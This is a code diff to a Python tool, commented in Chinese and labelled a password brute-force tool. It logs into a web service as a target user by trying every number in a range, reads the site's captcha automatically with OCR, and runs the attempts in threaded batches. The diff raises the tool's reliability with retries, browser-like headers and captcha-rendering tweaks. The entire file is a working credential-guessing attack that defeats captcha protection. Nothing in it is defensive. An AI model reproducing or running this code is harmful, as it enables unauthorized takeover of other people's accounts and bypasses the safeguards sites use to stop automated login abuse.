@@ -19,11 +19,15 @@ class PasswordCracker:
         start, end = map(int, segment.split('-'))
         self.password_range = range(start, end + 1)
         
-        # 高频配置
-        self.max_workers = 500
+        # 优化配置：降低并发，增加超时时间
+        self.max_workers = 10  # 从50降低到10，减少服务器压力
         self.found_password = None
         self.attempts = 0
         self.start_time = time.time()
+        
+        # 请求配置优化
+        self.timeout = 10  # 增加超时时间
+        self.retry_count = 2  # 重试次数
         
         # 初始化日志
         self.setup_logging()
@@ -32,14 +36,13 @@ class PasswordCracker:
         self.success_count = 0
         self.failure_count = 0
         self.captcha_failures = 0
+        self.timeout_count = 0
 
     def setup_logging(self):
         """设置日志配置"""
-        # 创建logs目录
         if not os.path.exists('logs'):
             os.makedirs('logs')
         
-        # 设置日志格式
         log_filename = f"logs/password_cracker_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
         
         logging.basicConfig(
@@ -47,14 +50,12 @@ class PasswordCracker:
             format='%(asctime)s - %(levelname)s - %(message)s',
             handlers=[
                 logging.FileHandler(log_filename, encoding='utf-8'),
-                logging.StreamHandler()  # 同时输出到控制台
+                logging.StreamHandler()
             ]
         )
         
         self.logger = logging.getLogger(__name__)
-        self.logger.info("=" * 60)
-        self.logger.info("🔐 密码爆破工具启动")
-        self.logger.info("=" * 60)
+        self.logger.info("🔐 密码爆破工具启动 - 优化版本")
 
     def init_ocr(self):
         """初始化OCR"""
@@ -66,47 +67,82 @@ class PasswordCracker:
             self.logger.error(f"❌ ddddocr 初始化失败: {e}")
             return None
 
-    def svg_to_png(self, svg_content):
-        """SVG转PNG"""
+    def improve_captcha_recognition(self, svg_content):
+        """改进验证码识别"""
         try:
             import cairosvg
-            return cairosvg.svg2png(bytestring=svg_content.encode('utf-8'))
+            # 尝试不同的DPI设置提高识别率
+            for dpi in [150, 200, 250]:
+                try:
+                    png_data = cairosvg.svg2png(
+                        bytestring=svg_content.encode('utf-8'),
+                        output_width=300,
+                        output_height=100,
+                        dpi=dpi
+                    )
+                    if png_data:
+                        return png_data
+                except:
+                    continue
+            return None
         except Exception as e:
             self.logger.warning(f"⚠️ SVG转换失败: {e}")
             return None
 
-    def save_password_to_file(self, password):
-        """保存密码到文件"""
-        try:
-            with open('found_password.txt', 'w', encoding='utf-8') as f:
-                f.write(f"目标用户: {self.target_username}\n")
-                f.write(f"密码: {password}\n")
-                f.write(f"发现时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
-                f.write(f"爆破范围: {self.password_range[0]}-{self.password_range[-1]}\n")
-                f.write(f"总尝试次数: {self.attempts}\n")
-                f.write(f"成功率: {(self.success_count/self.attempts*100):.2f}%\n")
-            self.logger.info(f"💾 密码已保存到 found_password.txt")
-            return True
-        except Exception as e:
-            self.logger.error(f"❌ 保存密码文件失败: {e}")
-            return False
+    def get_captcha_with_retry(self, session, max_retries=3):
+        """带重试的验证码获取"""
+        for attempt in range(max_retries):
+            try:
+                resp = session.get(self.captcha_url, timeout=5)
+                if resp.status_code == 200:
+                    data = resp.json().get('data', {})
+                    captcha_id, svg_data = data.get('id'), data.get('svg')
+                    if captcha_id and svg_data:
+                        return captcha_id, svg_data
+                time.sleep(1)  # 失败后等待1秒
+            except:
+                time.sleep(1)
+        return None, None
 
-    def log_attempt_stats(self):
-        """记录尝试统计信息"""
-        elapsed = time.time() - self.start_time
-        rate = self.attempts / elapsed if elapsed > 0 else 0
-        success_rate = (self.success_count / self.attempts * 100) if self.attempts > 0 else 0
-        
-        self.logger.info(f"📊 统计信息 - 尝试: {self.attempts}, 成功: {self.success_count}, "
-                        f"失败: {self.failure_count}, 验证码失败: {self.captcha_failures}, "
-                        f"速率: {rate:.1f}次/秒, 成功率: {success_rate:.2f}%")
+    def recognize_captcha_with_retry(self, svg_data, ocr, max_retries=3):
+        """带重试的验证码识别"""
+        for attempt in range(max_retries):
+            png_data = self.improve_captcha_recognition(svg_data)
+            if png_data:
+                try:
+                    result = ocr.classification(png_data)
+                    cleaned = re.sub(r'[^A-Za-z0-9]', '', result).upper()
+                    if cleaned and 3 <= len(cleaned) <= 6:  # 验证码通常3-6位
+                        return cleaned
+                except:
+                    pass
+            time.sleep(0.5)
+        return None
 
-    def try_password(self, password):
-        """尝试单个密码"""
+    def try_password_with_retry(self, password, max_retries=2):
+        """带重试的密码尝试"""
+        for retry in range(max_retries):
+            result = self._single_try(password, retry + 1)
+            if result:  # 如果成功或应该停止
+                return result
+            if retry < max_retries - 1:
+                time.sleep(1)  # 重试前等待
+        return None
+
+    def _single_try(self, password, attempt_num):
+        """单次尝试"""
         if self.found_password:
-            return None
+            return "STOP"
             
         session = requests.Session()
+        # 优化请求头
+        session.headers.update({
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+            'Accept': 'application/json, text/plain, */*',
+            'Content-Type': 'application/json',
+            'Connection': 'keep-alive'
+        })
+        
         ocr = self.init_ocr()
         if not ocr:
             self.failure_count += 1
@@ -115,120 +151,127 @@ class PasswordCracker:
         self.attempts += 1
         
         try:
-            # 获取验证码
-            self.logger.debug(f"🔍 尝试密码: {password} - 获取验证码")
-            resp = session.get(self.captcha_url, timeout=2)
+            # 获取验证码（带重试）
+            captcha_id, svg_data = self.get_captcha_with_retry(session)
+            if not captcha_id:
+                self.captcha_failures += 1
+                self.logger.debug(f"⚠️ 获取验证码失败 - 密码: {password}")
+                return None
+            
+            # 识别验证码（带重试）
+            captcha_text = self.recognize_captcha_with_retry(svg_data, ocr)
+            if not captcha_text:
+                self.captcha_failures += 1
+                self.logger.debug(f"⚠️ 验证码识别失败 - 密码: {password}")
+                return None
+            
+            # 尝试登录
+            login_data = {
+                'username': self.target_username,
+                'password': str(password),
+                'captcha_id': captcha_id,
+                'captcha_text': captcha_text
+            }
+            
+            resp = session.post(self.login_url, json=login_data, timeout=self.timeout)
             
             if resp.status_code == 200:
-                data = resp.json().get('data', {})
-                captcha_id, svg_data = data.get('id'), data.get('svg')
-                
-                if captcha_id and svg_data:
-                    # 识别验证码
-                    self.logger.debug(f"🔍 尝试密码: {password} - 识别验证码")
-                    png_data = self.svg_to_png(svg_data)
-                    if png_data:
-                        captcha_text = ocr.classification(png_data)
-                        captcha_text = re.sub(r'[^A-Za-z0-9]', '', captcha_text).upper()
-                        
-                        if captcha_text:
-                            # 尝试登录
-                            self.logger.debug(f"🔍 尝试密码: {password} - 提交登录")
-                            login_data = {
-                                'username': self.target_username,
-                                'password': str(password),
-                                'captcha_id': captcha_id,
-                                'captcha_text': captcha_text
-                            }
-                            
-                            resp = session.post(self.login_url, json=login_data, timeout=3)
-                            
-                            if resp.status_code == 200:
-                                result = resp.json()
-                                if result.get('success') and result.get('data'):
-                                    self.success_count += 1
-                                    self.logger.info(f"🎉🎉🎉 密码爆破成功! 密码: {password}")
-                                    # 保存密码到文件
-                                    if self.save_password_to_file(password):
-                                        self.found_password = password
-                                        return password
-                                else:
-                                    error_msg = result.get('message', '未知错误')
-                                    self.logger.debug(f"❌ 登录失败 - 密码: {password}, 错误: {error_msg}")
-                            else:
-                                self.logger.warning(f"⚠️ HTTP错误 - 密码: {password}, 状态码: {resp.status_code}")
-                        else:
-                            self.captcha_failures += 1
-                            self.logger.debug(f"⚠️ 验证码识别失败 - 密码: {password}")
-                    else:
-                        self.captcha_failures += 1
-                        self.logger.debug(f"⚠️ SVG转换失败 - 密码: {password}")
+                result = resp.json()
+                if result.get('success') and result.get('data'):
+                    self.success_count += 1
+                    self.logger.info(f"🎉🎉🎉 密码爆破成功! 密码: {password}")
+                    return password
                 else:
-                    self.captcha_failures += 1
-                    self.logger.warning(f"⚠️ 获取验证码数据失败 - 密码: {password}")
+                    error_msg = result.get('message', '未知错误')
+                    # 如果是密码错误，继续尝试；如果是其他错误，可能需要处理
+                    if "密码" in error_msg or "password" in error_msg.lower():
+                        self.logger.debug(f"❌ 密码错误: {password}")
+                    else:
+                        self.logger.warning(f"⚠️ 登录错误: {error_msg}")
             else:
-                self.failure_count += 1
-                self.logger.warning(f"⚠️ 验证码请求失败 - 密码: {password}, 状态码: {resp.status_code}")
+                self.logger.warning(f"⚠️ HTTP错误: {resp.status_code}")
                 
         except requests.exceptions.Timeout:
-            self.failure_count += 1
-            self.logger.warning(f"⏰ 请求超时 - 密码: {password}")
+            self.timeout_count += 1
+            self.logger.debug(f"⏰ 请求超时 - 密码: {password} (尝试 {attempt_num})")
+            return None  # 超时可以重试
         except requests.exceptions.ConnectionError:
             self.failure_count += 1
-            self.logger.error(f"🔌 连接错误 - 密码: {password}")
+            self.logger.warning(f"🔌 连接错误 - 密码: {password}")
+            return None
         except Exception as e:
             self.failure_count += 1
-            self.logger.error(f"💥 未知错误 - 密码: {password}, 错误: {e}")
+            self.logger.error(f"💥 未知错误: {e}")
         
-        # 每50次显示详细统计
-        if self.attempts % 50 == 0:
-            self.log_attempt_stats()
-                
         return None
+
+    def log_attempt_stats(self):
+        """记录统计信息"""
+        elapsed = time.time() - self.start_time
+        rate = self.attempts / elapsed if elapsed > 0 else 0
+        success_rate = (self.success_count / self.attempts * 100) if self.attempts > 0 else 0
+        
+        self.logger.info(f"📊 统计 - 尝试: {self.attempts}, 成功: {self.success_count}, "
+                        f"超时: {self.timeout_count}, 验证码失败: {self.captcha_failures}, "
+                        f"速率: {rate:.1f}次/秒, 成功率: {success_rate:.2f}%")
+
+    def try_password(self, password):
+        """包装函数用于线程池"""
+        return self.try_password_with_retry(password)
 
     def run(self):
         """主运行函数"""
-        self.logger.info(f"🚀 开始密码爆破")
+        self.logger.info(f"🚀 开始优化版密码爆破")
         self.logger.info(f"🎯 目标用户: {self.target_username}")
-        self.logger.info(f"🔢 爆破范围: {self.password_range[0]}-{self.password_range[-1]}")
+        self.logger.info(f"🔢 范围: {self.password_range[0]}-{self.password_range[-1]}")
         self.logger.info(f"🧵 并发线程: {self.max_workers}")
-        self.logger.info(f"⏰ 开始时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
-        self.logger.info("-" * 60)
+        self.logger.info(f"⏱️ 超时时间: {self.timeout}秒")
+        self.logger.info(f"🔄 重试次数: {self.retry_count}")
         
         try:
             with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
-                futures = {executor.submit(self.try_password, pwd): pwd for pwd in self.password_range}
+                # 分批处理，避免内存占用过大
+                batch_size = 1000
+                passwords = list(self.password_range)
                 
-                for future in as_completed(futures):
-                    result = future.result()
-                    if result:
-                        self.found_password = result
-                        # 取消所有未完成的任务
-                        for f in futures:
-                            f.cancel()
+                for i in range(0, len(passwords), batch_size):
+                    if self.found_password:
+                        break
+                        
+                    batch = passwords[i:i + batch_size]
+                    self.logger.info(f"🔍 处理批次 {i//batch_size + 1}/{(len(passwords)-1)//batch_size + 1}")
+                    
+                    futures = {executor.submit(self.try_password, pwd): pwd for pwd in batch}
+                    
+                    for future in as_completed(futures):
+                        result = future.result()
+                        if result and result != "STOP":
+                            self.found_password = result
+                            # 取消所有任务
+                            for f in futures:
+                                f.cancel()
+                            break
+                    
+                    # 每批次完成后显示统计
+                    self.log_attempt_stats()
+                    
+                    if self.found_password:
                         break
         
         except KeyboardInterrupt:
             self.logger.warning("⏹️ 用户中断执行")
         except Exception as e:
-            self.logger.error(f"💥 执行过程中发生错误: {e}")
+            self.logger.error(f"💥 执行错误: {e}")
         
-        # 最终统计
-        self.logger.info("-" * 60)
+        # 最终结果
+        self.logger.info("=" * 60)
         if self.found_password:
-            self.logger.info(f"✅ 爆破完成! 找到密码: {self.found_password}")
-            # 确保文件已创建
-            if not os.path.exists('found_password.txt'):
-                self.save_password_to_file(self.found_password)
+            self.logger.info(f"✅ 爆破成功! 密码: {self.found_password}")
         else:
             self.logger.info("❌ 爆破完成，未找到密码")
         
         self.log_attempt_stats()
-        self.logger.info(f"⏰ 结束时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
-        self.logger.info("=" * 60)
 
 if __name__ == "__main__":
     cracker = PasswordCracker()
     cracker.run()
-
-
